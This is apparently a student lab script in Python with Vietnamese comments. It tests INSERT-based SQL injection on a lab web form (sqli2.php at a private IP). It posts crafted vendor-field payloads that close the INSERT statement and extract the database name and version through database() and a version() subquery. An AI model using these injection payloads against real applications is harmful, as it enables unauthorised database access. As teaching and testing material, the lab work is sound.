#!/usr/bin/env python3
"""
Lab 05 - Kiem thu lo hong INSERT SQL Injection (sqli2.php)
Thuc hien chen du lieu va khai thac trich xuat du lieu qua truong vendor.
"""

import sys
import urllib.parse
import urllib.request

POST_URL = "http://10.2.6.80/sqli/sqli2.php"

TEST_CASES = [
    ("1. Them san pham binh thuong", {
        "cat": "keyboard", "vendor": "Logitech", "model": "K120", "price": "10"
    }),
    ("2. Tham do dau nhay don gay loi SQL", {
        "cat": "keyboard", "vendor": "anyVendor'", "model": "Test", "price": "5"
    }),
    ("3. Can thiep cau truc INSERT va dong chu thich", {
        "cat": "keyboard", "vendor": "anyVendor', '1', '2', '3');#", "model": "anyModel", "price": "0"
    }),
    ("4. Trich xuat ten database qua truong vendor", {
        "cat": "keyboard", "vendor": "anyVendor', database(), '2', '3');#", "model": "anyModel", "price": "0"
    }),
    ("5. Trich xuat phien ban CSDL bang Subquery", {
        "cat": "keyboard", "vendor": "anyVendor', (select version()), '2', '3');#", "model": "anyModel", "price": "0"
    }),
]

def run_tests():
    print(f"[*] Bat dau kiem thu INSERT SQL Injection tai: {POST_URL}")
    for title, form_data in TEST_CASES:
        print(f"\n===== {title} =====")
        encoded_data = urllib.parse.urlencode(form_data).encode('utf-8')
        try:
            req = urllib.request.Request(POST_URL, data=encoded_data, headers={"User-Agent": "Lab05-Tester"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                for line in body.splitlines():
                    if any(k in line for k in ["anyVendor", "Logitech", "webvul", "error", "MariaDB", "MySQL"]):
                        print(f"  {line.strip()[:100]}")
        except Exception as e:
            print(f"  [!] Loi ket noi: {e}")

if __name__ == "__main__":
    run_tests()
